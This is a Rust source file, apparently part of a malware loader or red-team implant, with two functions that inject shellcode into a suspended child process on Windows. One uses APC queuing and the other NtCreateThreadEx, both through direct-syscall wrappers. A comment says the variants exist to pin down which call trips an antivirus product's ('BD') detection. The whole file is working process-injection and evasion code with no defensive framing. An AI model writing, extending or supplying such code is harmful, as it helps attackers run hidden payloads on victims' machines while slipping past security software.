#![allow(unused)]

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::Threading::{
        CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA, CREATE_SUSPENDED,
    },
};

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const THREAD_ALL_ACCESS: u32 = 0x1FFFFF;

#[cfg(target_os = "windows")]
pub fn inject_apc(target_exe: &str, shellcode: &[u8]) -> super::InjectResult {
    use crate::syscall::{nt_alloc, nt_write, nt_protect, nt_queue_apc, nt_resume_thread};
    use core::ptr::null_mut;
    use std::ffi::CString;

    let exe_cstr = CString::new(target_exe).map_err(|_| String::from("invalid exe path"))?;

    let mut si: STARTUPINFOA = unsafe { core::mem::zeroed() };
    si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };

    let ok = unsafe {
        CreateProcessA(
            exe_cstr.as_ptr() as *const u8,
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        )
    };
    if ok == 0 {
        return Err("CreateProcessA failed".into());
    }

    let proc = pi.hProcess as isize;
    let thread = pi.hThread as isize;

    let mut base: *mut u8 = null_mut();
    let mut size: usize = shellcode.len().max(0x1000);
    let status = unsafe {
        nt_alloc(proc, &mut base, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    };
    if status < 0 || base.is_null() {
        unsafe {
            CloseHandle(pi.hProcess as _);
            CloseHandle(pi.hThread as _);
        }
        return Err("alloc failed".into());
    }

    let mut written: usize = 0;
    let status = unsafe {
        nt_write(proc, base, shellcode.as_ptr(), shellcode.len(), &mut written)
    };
    if status < 0 {
        unsafe {
            CloseHandle(pi.hProcess as _);
            CloseHandle(pi.hThread as _);
        }
        return Err("write failed".into());
    }

    let mut old_prot: u32 = 0;
    let mut prot_size: usize = size;
    let mut prot_base = base;
    let status = unsafe {
        nt_protect(proc, &mut prot_base, &mut prot_size, PAGE_EXECUTE_READ, &mut old_prot)
    };
    if status < 0 {
        unsafe {
            CloseHandle(pi.hProcess as _);
            CloseHandle(pi.hThread as _);
        }
        return Err("protect failed".into());
    }

    let status = unsafe {
        nt_queue_apc(thread, base as *const u8, null_mut(), null_mut(), null_mut())
    };
    if status < 0 {
        unsafe {
            CloseHandle(pi.hProcess as _);
            CloseHandle(pi.hThread as _);
        }
        return Err("queue apc failed".into());
    }

    let mut suspend_count: u32 = 0;
    unsafe {
        nt_resume_thread(thread, &mut suspend_count);
        CloseHandle(pi.hProcess as _);
        CloseHandle(pi.hThread as _);
    }

    Ok(())
}

/// Spawn `target_exe` suspended, inject shellcode via NtCreateThreadEx (no NtOpenProcess).
/// Used to isolate whether NtOpenProcess or NtCreateThreadEx is BD's detection trigger.
#[cfg(target_os = "windows")]
pub fn inject_classic_spawn(target_exe: &str, shellcode: &[u8]) -> super::InjectResult {
    use crate::syscall::{nt_alloc, nt_write, nt_protect, nt_create_thread_ex};
    use core::ptr::null_mut;
    use std::ffi::CString;

    let exe_cstr = CString::new(target_exe).map_err(|_| String::from("invalid exe path"))?;

    let mut si: STARTUPINFOA = unsafe { core::mem::zeroed() };
    si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };

    let ok = unsafe {
        CreateProcessA(
            exe_cstr.as_ptr() as *const u8,
            null_mut(), null_mut(), null_mut(), 0,
            CREATE_SUSPENDED, null_mut(), null_mut(), &mut si, &mut pi,
        )
    };
    if ok == 0 {
        return Err("CreateProcessA failed".into());
    }

    let proc = pi.hProcess as isize;
    let main_thread = pi.hThread as isize;

    let mut base: *mut u8 = null_mut();
    let mut size: usize = shellcode.len().max(0x1000);
    let status = unsafe { nt_alloc(proc, &mut base, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) };
    if status < 0 || base.is_null() {
        unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
        return Err("alloc failed".into());
    }

    let mut written: usize = 0;
    let status = unsafe { nt_write(proc, base, shellcode.as_ptr(), shellcode.len(), &mut written) };
    if status < 0 {
        unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
        return Err("write failed".into());
    }

    let mut old_prot: u32 = 0;
    let mut pb = base; let mut ps = size;
    unsafe { nt_protect(proc, &mut pb, &mut ps, PAGE_EXECUTE_READ, &mut old_prot) };

    let mut new_thread: isize = 0;
    let status = unsafe {
        nt_create_thread_ex(
            &mut new_thread, THREAD_ALL_ACCESS, null_mut(), proc,
            base, null_mut(), 0, 0, 0, 0, null_mut(),
        )
    };
    if status < 0 {
        unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
        return Err("create thread failed".into());
    }

    unsafe {
        if new_thread != 0 { CloseHandle(new_thread as _); }
        CloseHandle(pi.hProcess as _);
        CloseHandle(pi.hThread as _);
    }

    Ok(())
}
